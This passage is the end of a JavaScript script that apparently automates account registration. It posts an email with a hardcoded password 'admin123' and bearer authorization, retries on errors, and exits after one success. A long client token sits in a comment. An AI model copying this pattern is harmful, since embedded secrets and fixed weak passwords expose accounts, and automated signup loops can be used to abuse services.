                                    // 'Client-Token': 'AAALYP9yS2rCM/4tD169Rn6epA40P/5NDRhw48CnOC+odIRLwuwzsBZWg5gioSFRhDu6H2NmDbq9cGJOC5+Iep4tH+ta639HeRGi+irNyujmQmd2HtQfkwmnk6GQ0gFRsct3NFF98cAJE+uUmmyzzxKTbYxX2vAA+yH2x/5B9ET0BjSWkN3i9W5/5gkg2DRvNqGhrlc/vrGo5radvkE7SOrPZ717/34/625zC4/CM6V/6XD/rzHuVfKIY9vqF5Dmki2nPwy4mUsyH/7j5302Ey0YvpuKp82w3xaTy4Zm0KKvQt8qYhOzl8jyDs7i',
                                    'Authorization': 'Bearer ' + bearer,
                                    'Content-Type': 'application/json; charset=UTF-8',
                                    'Accept-Encoding': 'gzip',
                                },
                                data:
                                {
                                    email: email1,
                                    password: "admin123"
                                }
                            }).then(function (res) {
                                console.log(res.data)

                            })
                        //registemail()
                        max++
                        break;
            

                    }
                }
                continue;
            }
            o = 0
        } catch (err) {
            //console.log(err)
            await delay(10000)
            continue;
        }
        if (max == 1) {
            process.exit()
        }
    }

})();
